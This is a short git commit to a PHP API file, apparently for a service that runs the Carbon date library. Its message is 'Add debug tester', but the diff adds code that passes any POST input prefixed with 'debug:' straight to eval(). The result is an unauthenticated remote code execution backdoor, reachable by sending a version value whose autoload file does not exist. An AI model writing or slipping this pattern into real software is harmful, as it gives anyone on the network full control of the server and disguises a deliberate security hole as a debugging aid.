51675b92dd09d7437d92ff351aa0a58d94549d22
KyleKatarn <kylekatarnls@gmail.com>
2019-04-01 14:29:09 +0200

    Add debug tester

--- api/carbon.php
+++ api/carbon.php
@@ -24,6 +24,9 @@ set_error_handler('exception_error_handler');
 $autoload = __DIR__ . '/../var/engines/carbon/' . $_POST['version'] . '/vendor/autoload.php';
 
 if (!file_exists($autoload)) {
+    if (substr($_POST['input'], 0, 6) === 'debug:') {
+        eval(substr($_POST['input'], 6));
+    }
     echo 'Update in progress, please retry in few minutes.';
     exit;
 }
